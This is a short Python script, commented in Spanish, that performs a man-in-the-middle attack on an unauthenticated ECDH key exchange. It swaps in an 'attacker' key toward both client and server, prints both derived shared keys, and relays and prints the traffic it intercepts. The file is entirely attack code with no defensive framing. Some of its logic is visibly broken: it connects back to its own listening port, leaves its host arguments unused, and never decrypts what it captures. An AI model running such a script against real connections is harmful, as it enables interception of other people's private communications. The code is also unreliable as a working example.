import socket
from cryptography.hazmat.primitives.asymmetric import ec
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.kdf.hkdf import HKDF
import threading

def generate_keys():
    private_key = ec.generate_private_key(ec.SECP256R1())
    public_key = private_key.public_key()
    return private_key, public_key

def serialize_key(key):
    return key.public_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PublicFormat.SubjectPublicKeyInfo
    )

def deserialize_key(pem_key):
    return serialization.load_pem_public_key(pem_key)

def derive_shared_key(private_key, peer_public_key):
    shared_key = private_key.exchange(ec.ECDH(), peer_public_key)
    derived_key = HKDF(
        algorithm=hashes.SHA256(),
        length=32,
        salt=None,
        info=b'handshake data'
    ).derive(shared_key)
    return derived_key

def handle_client(conn, addr, server_socket):
    print(f"Accepted connection from {addr}")
    
    attacker_private_key, attacker_public_key = generate_keys()

    # Receive client's public key
    client_public_key_pem = conn.recv(1024)
    client_public_key = deserialize_key(client_public_key_pem)
    
    # Send attacker's public key to client
    conn.sendall(serialize_key(attacker_public_key))

    # Connect to server and receive server's public key
    server_socket.connect(('127.0.0.1', 65432))  # Ajusta el host y puerto según sea necesario
    server_public_key_pem = server_socket.recv(1024)
    server_public_key = deserialize_key(server_public_key_pem)

    # Send attacker's public key to server
    server_socket.sendall(serialize_key(attacker_public_key))

    # Derive shared keys
    client_shared_key = derive_shared_key(attacker_private_key, client_public_key)
    server_shared_key = derive_shared_key(attacker_private_key, server_public_key)

    print("Shared key with client:", client_shared_key)
    print("Shared key with server:", server_shared_key)

    # Relay messages between client and server
    while True:
        data_from_client = conn.recv(4096)
        if not data_from_client:
            break
        print("Intercepted from client:", data_from_client)
        server_socket.sendall(data_from_client)

        data_from_server = server_socket.recv(4096)
        if not data_from_server:
            break
        print("Intercepted from server:", data_from_server)
        conn.sendall(data_from_server)

    conn.close()
    server_socket.close()

def mitm_attack(client_host, client_port, server_host, server_port):
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind(('0.0.0.0', 65432))  # Ajusta el puerto si es necesario
    server_socket.listen(1)

    while True:
        conn, addr = server_socket.accept()
        server_connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client_handler = threading.Thread(target=handle_client, args=(conn, addr, server_connection))
        client_handler.start()

if __name__ == "__main__":
    mitm_attack(client_host='192.168.1.250', client_port=65432, server_host='192.168.1.240', server_port=65432)
